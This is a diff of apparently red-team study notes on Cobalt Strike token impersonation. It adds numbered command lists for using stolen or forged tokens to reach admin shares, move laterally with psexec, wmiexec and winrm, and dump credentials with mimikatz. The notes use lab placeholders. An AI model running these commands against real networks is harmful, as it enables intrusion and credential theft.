@@ -17,13 +17,25 @@ beacon> make_token CONTOSO\rsteel Passw0rd!
 his allows Beacon to use the alternate credentials when interacting with resources on the network.  It has no impact on local actions.
 explanation:-
 
+✅ 1. Access SMB shares
 make_token CONTOSO\rsteel Passw0rd!
 dir \\10.10.10.1\C$
 
-👉 If rsteel has access → command works
-👉 If not → access denied
+✅ 2. Remote command execution
+make_token CONTOSO\rsteel Passw0rd!
+jump psexec 10.10.10.1 listener
 
+✅ 3. WMI execution
+make_token CONTOSO\rsteel Passw0rd!
+jump wmiexec 10.10.10.1 listener
 
+✅ 4. WinRM (if enabled)
+make_token CONTOSO\rsteel Passw0rd!
+jump winrm 10.10.10.1 listener
+
+✅ 5. Mapping drives
+make_token CONTOSO\rsteel Passw0rd!
+net use \\10.10.10.1\C$
 ====================================================================================================================================================
 This technique does require a high-integrity session.
 
@@ -49,7 +61,31 @@ beacon> steal_token 5248
 [+] Impersonated CONTOSO\rsteel
 \\\
 
-3️⃣ Move Laterally
+🚀 How to USE this token
+
+✅ 1. Check identity
+whoami
+👉 Now shows:
+contoso\rsteel
+✅ 2. Check privileges
+whoami /groups
+👉 See if:
+
+Local Admin
+Domain Admin
+Any interesting groups
+✅ 3. Dump credentials (VERY IMPORTANT)
+mimikatz sekurlsa::logonpasswords
+👉 You can dump:
+
+Other users
+Possibly Domain Admin creds 💥
+✅ 4. Access local resources
+dir C:\Users\rsteel\Desktop
+
+✅ 5. Lateral movement
+jump psexec target listener
+
 jump psexec 10.10.10.1 smb
 jump wmiexec 10.10.10.1
 jump winrm 10.10.10.1
